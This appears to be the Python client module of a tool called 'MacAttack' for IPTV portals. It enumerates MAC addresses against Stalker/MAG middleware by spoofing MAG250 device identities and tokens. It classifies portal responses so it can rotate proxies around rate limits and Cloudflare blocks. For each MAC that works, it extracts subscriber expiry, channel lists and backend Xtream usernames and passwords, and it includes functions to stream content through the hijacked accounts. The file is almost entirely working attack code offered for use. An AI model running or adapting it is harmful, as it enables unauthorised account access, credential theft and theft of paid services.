"""
STB API Client v2.0 - Optimized for speed
- No sessions (direct requests)
- 2-Phase: Quick Scan (handshake) → Full Scan (details)
- Proper error classification for proxy retry
- Fast timeouts (3s connect, configurable read)
"""
import requests
from urllib.parse import urlparse, quote
import hashlib
import json
import time
import logging

logger = logging.getLogger("MacAttack.stb")


# ============== ERROR TYPES ==============

class ProxyError(Exception):
    """Base proxy error - retry MAC with different proxy"""
    pass

class ProxyDeadError(ProxyError):
    """Proxy unreachable (connection refused, DNS fail)"""
    pass

class ProxySlowError(ProxyError):
    """Proxy timeout"""
    pass

class ProxyBlockedError(ProxyError):
    """Proxy blocked by portal (403, rate limit)"""
    pass


# ============== HELPERS ==============

def parse_proxy(proxy_str):
    """Parse proxy string to requests format."""
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if proxy_str.startswith(("socks5://", "socks4://", "http://")):
        return {"http": proxy_str, "https": proxy_str}
    return {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}


def generate_device_ids(mac):
    """Generate device IDs from MAC."""
    sn = hashlib.md5(mac.encode()).hexdigest().upper()[:13]
    device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
    device_id2 = hashlib.sha256(mac.encode()).hexdigest().upper()
    hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
    return sn, device_id, device_id2, hw_version_2


def get_headers(token=None, token_random=None):
    """Get request headers."""
    headers = {
        "User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
        "Accept-Encoding": "identity",
        "Accept": "*/*",
        "Connection": "close",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if token_random is not None:
        headers["X-Random"] = str(token_random)
    return headers


def get_cookies(mac):
    """Get request cookies."""
    sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
    return {
        "adid": hw_version_2, "debug": "1", "device_id2": device_id2,
        "device_id": device_id, "hw_version": "1.7-BD-00", "mac": mac,
        "sn": sn, "stb_lang": "en", "timezone": "America/Los_Angeles",
    }


def get_portal_info(url):
    """Extract base URL and portal type from URL."""
    url = url.rstrip('/')
    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    scheme = parsed.scheme or "http"
    base = f"{scheme}://{host}:{port}"
    
    if "stalker_portal" in url:
        return base, "stalker_portal/server/load.php"
    return base, "portal.php"


def do_request(url, cookies, headers, proxies, timeout, connect_timeout=5):
    """
    Make HTTP request with proper error handling.
    
    Returns: Response object
    Raises: 
        - ProxyDeadError: Connection failed, proxy offline
        - ProxySlowError: Timeout, gateway errors
        - ProxyBlockedError: Proxy blocked by portal (Cloudflare, rate limit)
    
    Note: HTTP 401 is NOT raised - caller must check (MAC invalid)
    """
    try:
        resp = requests.get(url, cookies=cookies, headers=headers, 
                           proxies=proxies, timeout=(connect_timeout, timeout))
        
        # Check for Cloudflare / HTML error pages (proxy blocked)
        content_type = resp.headers.get("Content-Type", "").lower()
        if "text/html" in content_type:
            if "cloudflare" in resp.text.lower() or "captcha" in resp.text.lower():
                raise ProxyBlockedError("Cloudflare/Captcha detected")
            if resp.status_code >= 400:
                raise ProxyBlockedError(f"HTTP {resp.status_code} - HTML response")
        
        # HTTP 403 = Could be proxy blocked OR MAC invalid - check response
        if resp.status_code == 403:
            try:
                data = resp.json()
                if isinstance(data, dict):
                    return resp
            except:
                pass
            raise ProxyBlockedError("403 Forbidden - Proxy blocked")
        
        # Gateway errors = Proxy slow/overloaded
        if resp.status_code in (502, 503, 504):
            raise ProxySlowError(f"Gateway error {resp.status_code}")
        
        # 429 = Rate limit (proxy blocked)
        if resp.status_code == 429:
            raise ProxyBlockedError("Rate limit exceeded")
        
        return resp
        
    except requests.exceptions.ConnectTimeout:
        raise ProxyDeadError("Connect timeout")
    except requests.exceptions.ReadTimeout:
        raise ProxySlowError("Read timeout")
    except requests.exceptions.ProxyError as e:
        raise ProxyDeadError(f"Proxy error: {e}")
    except requests.exceptions.ConnectionError as e:
        err = str(e).lower()
        if any(x in err for x in ["refused", "unreachable", "no route", "dns"]):
            raise ProxyDeadError(str(e))
        raise ProxySlowError(str(e))
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except Exception as e:
        raise ProxyError(str(e))


# ============== MAIN SCAN FUNCTION ==============

def test_mac(url, mac, proxy=None, timeout=10, connect_timeout=5, require_channels=True, min_channels=1, compatible_mode=False):
    """
    Test MAC address - Optimized 3-Phase approach:
    
    Phase 1 (Quick Scan): Handshake only
    - Token received = VALID → continue to Phase 2
    - No token = NOT VALID → return immediately (with proxy retry logic)
    - Proxy error → raise for retry with different proxy
    
    Phase 2 (Quick Validation): Channel count check
    - Has enough channels = VALID → continue to Phase 3 (Full Scan)
    - Not enough channels = NOT VALID → return immediately
    - Proxy error → raise for retry with different proxy
    
    Phase 3 (Full Scan): Get all details
    - Collect expiry, genres, VOD, backend, etc.
    - Only executed for confirmed valid MACs
    - Proxy errors here also raise for retry
    
    Returns: (is_valid, result_dict)
    - is_valid: True if token received AND enough channels
    - result_dict: All collected data (only complete for valid MACs)
    
    Raises: ProxyDeadError, ProxySlowError, ProxyBlockedError
    """
    base_url, portal_type = get_portal_info(url)
    cookies = get_cookies(mac)
    headers = get_headers()
    proxies = parse_proxy(proxy)
    
    # ========== PHASE 1: QUICK SCAN (Handshake) ==========
    handshake_url = f"{base_url}/{portal_type}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
    
    resp = do_request(handshake_url, cookies, headers, proxies, timeout, connect_timeout)
    
    # MacAttack.pyw style: Accept multiple HTTP status codes
    if resp.status_code not in [200, 204, 404, 512]:
        # Unexpected status code - might be proxy issue
        raise ProxyBlockedError(f"HTTP {resp.status_code} - Unexpected status code")
    
    # MacAttack.pyw style: Check for specific portal errors in text
    if "REMOTE_ADDR" in resp.text or "Backend not available" in resp.text:
        return False, {"mac": mac, "error": "Portal error"}
    
    # Parse token - handle invalid JSON (proxy issue)
    token = None
    token_random = None
    try:
        data = resp.json()
        token = data.get("js", {}).get("token")
        token_random = data.get("js", {}).get("random")
    except (json.JSONDecodeError, ValueError) as e:
        # JSON parsing failed - likely proxy issue, not MAC issue
        raise ProxySlowError(f"Invalid JSON response: {e}")
    except Exception as e:
        raise ProxySlowError(f"Failed to parse response: {e}")
    
    # MacAttack.pyw style: Token check with mode selection
    if not token:
        if compatible_mode:
            # MacAttack.pyw compatible: No token = MAC invalid, no retry
            return False, {"mac": mac, "error": "No token - MAC invalid (compatible mode)"}
        else:
            # Intelligent mode: Analyze response for retry decision
            if resp.text.strip() == "" or len(resp.text) < 10:
                # Empty or very short response - likely proxy issue
                raise ProxySlowError("No token - Empty/short response (possible proxy issue)")
            elif resp.status_code == 404:
                # 404 with no token - could be portal issue OR proxy blocked
                try:
                    if isinstance(data, dict) and ("js" in data or "error" in data):
                        # Structured 404 response = MAC invalid
                        return False, {"mac": mac, "error": "No token - MAC invalid (404)"}
                    else:
                        # Unstructured 404 = might be proxy blocked
                        raise ProxyBlockedError("No token - Unstructured 404 (possible proxy block)")
                except:
                    raise ProxyBlockedError("No token - 404 response analysis failed")
            else:
                # Try to analyze response structure
                try:
                    if isinstance(data, dict) and ("js" in data or "error" in data):
                        # Structured response but no token = MAC invalid
                        return False, {"mac": mac, "error": "No token - MAC invalid (structured response)"}
                    else:
                        # Unstructured response = might be proxy issue
                        raise ProxySlowError("No token - Unstructured response (possible proxy issue)")
                except:
                    # If we can't analyze, assume MAC invalid (safe default)
                    return False, {"mac": mac, "error": "No token - MAC invalid (analysis failed)"}
    
    # ========== TOKEN RECEIVED = MAC IS VALID ==========
    # ========== PHASE 2: FULL SCAN (Details) ==========
    
    sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
    headers = get_headers(token, token_random)
    
    result = {
        "mac": mac,
        "expiry": "Unknown",
        "channels": 0,
        "genres": [],
        "vod_categories": [],
        "series_categories": [],
        "backend_url": None,
        "username": None,
        "password": None,
        "max_connections": None,
        "created_at": None,
        "client_ip": None,
    }
    
    # Calculate sig
    if token_random:
        sig = hashlib.sha256(str(token_random).encode()).hexdigest().upper()
    else:
        sig = hashlib.sha256(f"{sn}{mac}".encode()).hexdigest().upper()
    
    metrics = json.dumps({"mac": mac, "sn": sn, "type": "STB", "model": "MAG250", 
                          "uid": device_id, "random": token_random or 0})
    
    # Step 1: Activate profile (critical - raises on proxy error)
    try:
        profile_url = f"{base_url}/{portal_type}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; ImageDate: Wed Aug 29 10:49:53 EEST 2018; PORTAL version: 5.3.1; API Version: JS API version: 343; STB API version: 146; Player Engine version: 0x58c&num_banks=2&sn={sn}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={device_id2}&device_id2={device_id2}&sig={sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={quote(metrics)}&hw_version_2={hw_version_2}&timestamp={int(time.time())}&api_sig=262&prehash=0"
        resp = do_request(profile_url, cookies, headers, proxies, timeout, connect_timeout)
        
        if resp.status_code == 401:
            return False, {"mac": mac, "error": "401 during profile"}
        
        try:
            data = resp.json()
        except (json.JSONDecodeError, ValueError):
            raise ProxySlowError("Invalid JSON in get_profile")
        
        if "js" in data:
            result["client_ip"] = data["js"].get("ip")
            if data["js"].get("expire_billing_date"):
                result["expiry"] = data["js"]["expire_billing_date"]
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 2: get_main_info for expiry (critical)
    try:
        main_url = f"{base_url}/{portal_type}?type=account_info&action=get_main_info&JsHttpRequest=1-xml"
        resp = do_request(main_url, cookies, headers, proxies, timeout, connect_timeout)
        
        if resp.status_code == 401:
            return False, {"mac": mac, "error": "401 during main_info"}
        
        try:
            data = resp.json()
        except (json.JSONDecodeError, ValueError):
            raise ProxySlowError("Invalid JSON in get_main_info")
        
        js = data.get("js", {})
        expiry = js.get("phone", "")
        if expiry:
            try:
                result["expiry"] = time.strftime("%B %d, %Y", time.gmtime(int(expiry)))
            except:
                result["expiry"] = str(expiry)
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 3: Channels (critical for validation) - QUICK CHECK FIRST
    channels_count = 0
    try:
        ch_url = f"{base_url}/{portal_type}?type=itv&action=get_all_channels&JsHttpRequest=1-xml"
        resp = do_request(ch_url, cookies, headers, proxies, timeout, connect_timeout)
        
        try:
            data = resp.json()
        except (json.JSONDecodeError, ValueError):
            raise ProxySlowError("Invalid JSON in get_channels")
        
        if "js" in data and "data" in data["js"]:
            channels_count = len(data["js"]["data"])
            result["channels"] = channels_count
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # ========== QUICK VALIDATION (like MacAttack.pyw) ==========
    # Check channels BEFORE doing expensive full scan
    if require_channels and channels_count < min_channels:
        return False, {"mac": mac, "error": f"Only {channels_count} channels (minimum: {min_channels})"}
    
    # ========== TOKEN + CHANNELS VALID → CONTINUE WITH FULL SCAN ==========
    
    # Step 4: Genres (critical for DE detection)
    try:
        g_url = f"{base_url}/{portal_type}?type=itv&action=get_genres&JsHttpRequest=1-xml"
        resp = do_request(g_url, cookies, headers, proxies, timeout, connect_timeout)
        
        try:
            data = resp.json()
        except (json.JSONDecodeError, ValueError):
            raise ProxySlowError("Invalid JSON in get_genres")
        
        if "js" in data:
            result["genres"] = [g.get("title", "") for g in data["js"] if g.get("id") != "*"]
    except (ProxyDeadError, ProxySlowError, ProxyBlockedError):
        raise
    except:
        pass
    
    # Step 5: VOD categories (non-critical - no raise)
    try:
        v_url = f"{base_url}/{portal_type}?type=vod&action=get_categories&JsHttpRequest=1-xml"
        resp = requests.get(v_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        data = resp.json()
        if "js" in data:
            result["vod_categories"] = [c.get("title", "") for c in data["js"] if c.get("id") != "*"]
    except:
        pass
    
    # Step 6: Series categories (non-critical)
    try:
        s_url = f"{base_url}/{portal_type}?type=series&action=get_categories&JsHttpRequest=1-xml"
        resp = requests.get(s_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        data = resp.json()
        if "js" in data:
            result["series_categories"] = [c.get("title", "") for c in data["js"] if c.get("id") != "*"]
    except:
        pass
    
    # Step 7: Backend/Credentials (non-critical)
    try:
        link_url = f"{base_url}/{portal_type}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml"
        resp = requests.get(link_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        data = resp.json()
        cmd = data.get("js", {}).get("cmd", "")
        if cmd:
            cmd = cmd.replace("ffmpeg ", "").replace("'ffmpeg' ", "")
            parsed = urlparse(cmd)
            if parsed.hostname:
                result["backend_url"] = f"{parsed.scheme}://{parsed.hostname}"
                if parsed.port:
                    result["backend_url"] += f":{parsed.port}"
                parts = parsed.path.strip("/").split("/")
                if len(parts) >= 2:
                    result["username"], result["password"] = parts[0], parts[1]
                    # Xtream API
                    try:
                        x_url = f"{result['backend_url']}/player_api.php?username={result['username']}&password={result['password']}"
                        xr = requests.get(x_url, proxies=proxies, timeout=(3, 5))
                        xd = xr.json().get("user_info", {})
                        if "max_connections" in xd:
                            result["max_connections"] = int(xd["max_connections"])
                        if "created_at" in xd:
                            result["created_at"] = time.strftime("%B %d, %Y", time.gmtime(int(xd["created_at"])))
                    except:
                        pass
    except:
        pass
    
    return True, result


# ============== PLAYER FUNCTIONS ==============

def get_token(url, mac, proxy=None, timeout=10):
    """Get token for player."""
    base_url, portal_type = get_portal_info(url)
    cookies = get_cookies(mac)
    headers = get_headers()
    proxies = parse_proxy(proxy)
    
    try:
        handshake_url = f"{base_url}/{portal_type}?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
        resp = requests.get(handshake_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        data = resp.json()
        token = data.get("js", {}).get("token")
        token_random = data.get("js", {}).get("random")
        
        if token:
            sn, device_id, device_id2, hw_version_2 = generate_device_ids(mac)
            headers = get_headers(token, token_random)
            
            if token_random:
                sig = hashlib.sha256(str(token_random).encode()).hexdigest().upper()
            else:
                sig = hashlib.sha256(f"{sn}{mac}".encode()).hexdigest().upper()
            
            metrics = json.dumps({"mac": mac, "sn": sn, "type": "STB", "model": "MAG250", 
                                  "uid": device_id, "random": token_random or 0})
            
            profile_url = f"{base_url}/{portal_type}?type=stb&action=get_profile&hd=1&sn={sn}&stb_type=MAG250&device_id={device_id2}&device_id2={device_id2}&sig={sig}&metrics={quote(metrics)}&hw_version_2={hw_version_2}&timestamp={int(time.time())}"
            requests.get(profile_url, cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
            
            return token, token_random, portal_type, "5.3.1"
    except:
        pass
    
    return None, None, "portal.php", "5.3.1"


def get_genres(url, mac, token, portal_type, token_random=None, proxy=None, timeout=10):
    """Get live TV genres."""
    base_url, _ = get_portal_info(url)
    headers = get_headers(token, token_random)
    cookies = get_cookies(mac)
    proxies = parse_proxy(proxy)
    
    try:
        resp = requests.get(f"{base_url}/{portal_type}?type=itv&action=get_genres&JsHttpRequest=1-xml",
                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        return resp.json().get("js", [])
    except:
        return []


def get_vod_categories(url, mac, token, portal_type, token_random=None, proxy=None, timeout=10):
    """Get VOD categories."""
    base_url, _ = get_portal_info(url)
    headers = get_headers(token, token_random)
    cookies = get_cookies(mac)
    proxies = parse_proxy(proxy)
    
    try:
        resp = requests.get(f"{base_url}/{portal_type}?type=vod&action=get_categories&JsHttpRequest=1-xml",
                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        return resp.json().get("js", [])
    except:
        return []


def get_series_categories(url, mac, token, portal_type, token_random=None, proxy=None, timeout=10):
    """Get series categories."""
    base_url, _ = get_portal_info(url)
    headers = get_headers(token, token_random)
    cookies = get_cookies(mac)
    proxies = parse_proxy(proxy)
    
    try:
        resp = requests.get(f"{base_url}/{portal_type}?type=series&action=get_categories&JsHttpRequest=1-xml",
                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        return resp.json().get("js", [])
    except:
        return []


def get_channels(url, mac, token, portal_type, category_type, category_id, token_random=None, proxy=None, timeout=10):
    """Get channels for category."""
    base_url, _ = get_portal_info(url)
    headers = get_headers(token, token_random)
    cookies = get_cookies(mac)
    proxies = parse_proxy(proxy)
    
    type_map = {"IPTV": "itv", "VOD": "vod", "Series": "series"}
    t = type_map.get(category_type, "itv")
    param = "genre" if t == "itv" else "category"
    
    try:
        resp = requests.get(f"{base_url}/{portal_type}?type={t}&action=get_ordered_list&{param}={category_id}&p=1&JsHttpRequest=1-xml",
                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        data = resp.json()
        channels = data.get("js", {}).get("data", [])
        total = data.get("js", {}).get("total_items", len(channels))
        return channels, total
    except:
        return [], 0


def get_stream_url(url, mac, token, portal_type, cmd, token_random=None, proxy=None, timeout=10):
    """Get stream URL for live channel."""
    base_url, _ = get_portal_info(url)
    headers = get_headers(token, token_random)
    cookies = get_cookies(mac)
    proxies = parse_proxy(proxy)
    
    try:
        resp = requests.get(f"{base_url}/{portal_type}?type=itv&action=create_link&cmd={quote(cmd)}&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml",
                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        cmd_val = resp.json().get("js", {}).get("cmd", "")
        if cmd_val:
            return cmd_val.replace("ffmpeg ", "").replace("'ffmpeg' ", "")
    except:
        pass
    return None


def get_vod_stream_url(url, mac, token, portal_type, cmd, token_random=None, proxy=None, timeout=10):
    """Get stream URL for VOD."""
    base_url, _ = get_portal_info(url)
    headers = get_headers(token, token_random)
    cookies = get_cookies(mac)
    proxies = parse_proxy(proxy)
    
    try:
        resp = requests.get(f"{base_url}/{portal_type}?type=vod&action=create_link&cmd={quote(cmd)}&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml",
                           cookies=cookies, headers=headers, proxies=proxies, timeout=(3, timeout))
        cmd_val = resp.json().get("js", {}).get("cmd", "")
        if cmd_val:
            return cmd_val.replace("ffmpeg ", "").replace("'ffmpeg' ", "")
    except:
        pass
    return None


def test_proxy(proxy, timeout=5):
    """Test if proxy works."""
    try:
        proxies = parse_proxy(proxy)
        resp = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=(3, timeout))
        return resp.status_code == 200, None
    except Exception as e:
        return False, str(e)


def auto_detect_portal_url(base_url, proxy=None, timeout=5):
    """Auto-detect portal endpoint."""
    import re
    base_url = base_url.rstrip('/')
    parsed = urlparse(base_url)
    host = parsed.hostname
    port = parsed.port or 80
    scheme = parsed.scheme or "http"
    
    if '/c' in parsed.path:
        base, pt = get_portal_info(base_url)
        return base_url, pt, "5.3.1"
    
    clean = f"{scheme}://{host}:{port}"
    proxies = parse_proxy(proxy)
    
    for endpoint, pt in [("/c/", "portal.php"), ("/stalker_portal/c/", "stalker_portal/server/load.php")]:
        try:
            resp = requests.get(f"{clean}{endpoint}version.js", proxies=proxies, timeout=(3, timeout))
            if resp.status_code == 200 and "var ver" in resp.text:
                m = re.search(r"var ver = ['\"](.+?)['\"]", resp.text)
                ver = m.group(1) if m else "5.3.1"
                return f"{clean}{endpoint.rstrip('/')}", pt, ver
        except:
            pass
    
    return f"{clean}/c", "portal.php", "5.3.1"
